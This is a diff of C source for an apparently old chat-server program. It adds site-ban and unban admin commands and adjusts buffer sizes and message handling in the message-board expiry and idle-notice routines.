+bansite(user,inpstr)
+int user;
+char *inpstr;
+{
+FILE *fp;
+char line[81],site[ARR_SIZE];
+
+if (!inpstr[0]) {
+	write_user(user,"Usage: bansite <site>");  return;
+	}
+sscanf(inpstr,"%s ",site);
+if (strlen(site)>80) {
+	write_user(user,"Site name too long");  return;
+	}
+gethostname(line,80);
+if (!strcmp(line,site)) {
+	write_user(user,"You cannot ban the machine this server is running on");  
+	return;
+	}
+
+/* see if site already banned */
+if ((fp=fopen(BANFILE,"r"))) {
+	fgets(line,80,fp);
+	while(!feof(fp)) {
+		line[strlen(line)-1]=0;
+		if (!strcmp(line,site)) {
+			write_user(user,"That site is already banned\n");
+			fclose(fp);  return;
+			}
+		fgets(line,80,fp);
+		}
+	fclose(fp);
+	}
+
+/* Add new ban */
+if (!(fp=fopen(BANFILE,"a"))) {
+	sprintf(mess,"%s : couldn't write to banned file\n",syserror);
+	write_user(user,mess);
+	write_syslog("ERROR: Couldn't open banned file to append in bansite()\n",0);
+	return;
+	}
+fprintf(fp,"%s\n",site);
+fclose(fp);
+sprintf(mess,"%s BANNED site %s\n",ustr[user].name,site);
+write_syslog(mess,1);
+write_user(user,"Site banned");
+}
+
+
+
+/*** Unban a site ***/
+unbansite(user,inpstr)
+int user;
+char *inpstr;
+{
+FILE *fpi,*fpo;
+int found=0;
+char line[81],site[ARR_SIZE];
+
+if (!inpstr[0]) {
+	write_user(user,"Usage: unbansite <site>");  return;
+	}
+sscanf(inpstr,"%s ",site);
+if (strlen(site)>80) {
+	write_user(user,"Site name too long");  return;
+	}
+
+if (!(fpi=fopen(BANFILE,"r"))) {
+	write_user(user,"Site not found in file");  return;
+	}
+if (!(fpo=fopen("tempfile","w"))) {
+	sprintf(mess,"%s : couldn't open a temporary file\n",syserror);
+	write_user(user,mess);
+	write_syslog("ERROR: Couldn't open tempfile to write in unbansite()\n",0);
+	fclose(fpi);  return;
+	}
+
+/* Go through banfile */
+fgets(line,80,fpi);
+while(!feof(fpi)) {
+	line[strlen(line)-1]=0;
+	if (strcmp(line,site)) {
+		line[strlen(line)]='\n';  fputs(line,fpo);
+		}
+	else found=1;
+	fgets(line,80,fpi);
+	}
+fclose(fpo);  fclose(fpi);
+if (!found) {
+	write_user(user,"Site not found in file");
+	unlink("tempfile");  return;
+	}
+
+/* Make the temp file the ban file. */
+if (rename("tempfile",BANFILE)==-1) {
+	sprintf(mess,"%s : renaming failure\n",syserror);
+	write_user(user,mess);
+	write_syslog("ERROR: Couldn't rename temp file to ban file in banfile()\n",0);
+	return;
+	}
+sprintf(mess,"%s UNBANNED site %s\n",ustr[user].name,site);
+write_syslog(mess,1);
+write_user(user,"Site ban removed");
+}
+
+
+
 
 
 /***************************** EVENT FUNCTIONS *****************************/
@@ -2739,7 +2987,7 @@ check_mess(startup)
 int startup;
 {
 int b,tm,day,day2;
-char line[ARR_SIZE+31],datestr[30],timestr[7],boardfile[20],tempfile[20];
+char line[ARR_SIZE+1],datestr[30],timestr[7],boardfile[20],tempfile[20];
 char daystr[3],daystr2[3],month[4],month2[4];
 FILE *bfp,*tfp;
 
@@ -2769,7 +3017,7 @@ for(b=0;b<NUM_AREAS;++b) {
 		}
 
 	/* go through board and write valid messages to temp file */
-	fgets(line,ARR_SIZE+30,bfp);
+	fgets(line,ARR_SIZE,bfp);
 	while(!feof(bfp)) {
 		if (line[0]!='=') {
 			midcpy(line,daystr2,5,6);
@@ -2779,9 +3027,8 @@ for(b=0;b<NUM_AREAS;++b) {
 			}
 		if (line[0]=='=' || day2>=day-MESS_LIFE) fputs(line,tfp);
 		else astr[b].mess_num--;
-		fgets(line,ARR_SIZE+30,bfp);
+		fgets(line,ARR_SIZE,bfp);
 		}
-	fputs(mess,tfp);
 	fclose(bfp);  fclose(tfp);
 	unlink(boardfile);
 
@@ -2804,8 +3051,8 @@ for (user=0;user<MAX_USERS;++user) {
 	if (ustr[user].sock==-1) continue;
 	idle=((int)time((time_t *)0)-ustr[user].last_input)/60;
 	if (!ustr[user].logging_in && !ustr[user].idle_mention && idle>=IDLE_MENTION) {
-		sprintf(mess,"%s's eyes glaze over...\n",ustr[user].name);
-		write_alluser(user,mess,0,0);
+		sprintf(mess2,"%s's eyes glaze over...\n",ustr[user].name);
+		write_alluser(user,mess2,0,0);
 		write_user(user,"Your eyes glaze over...\n");
 		ustr[user].idle_mention=1;
 		}
